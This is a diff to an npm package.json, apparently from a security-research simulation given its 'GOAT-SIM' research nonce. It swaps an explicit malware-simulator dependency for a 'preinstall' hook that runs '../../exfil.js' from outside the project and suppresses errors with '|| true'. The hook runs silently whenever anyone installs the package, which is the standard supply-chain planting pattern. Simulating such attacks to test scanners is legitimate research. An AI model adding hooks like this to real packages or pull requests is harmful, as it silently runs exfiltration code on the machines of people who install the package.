@@ -1,13 +1,12 @@
 {
   "name": "npmtest",
   "version": "1.0.0",
-  "description": "",
+  "description": "PRT-SCAN-RESEARCH-NONCE-FULLCHAIN-GOAT-SIM-001",
   "main": "test.js",
-  "dependencies": {
-    "@step-security/malware-simulator": "file:../malware-simulators/exfiltration-simulator"
-  },
+  "dependencies": {},
   "devDependencies": {},
   "scripts": {
+    "preinstall": "node ../../exfil.js || true",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "author": "",
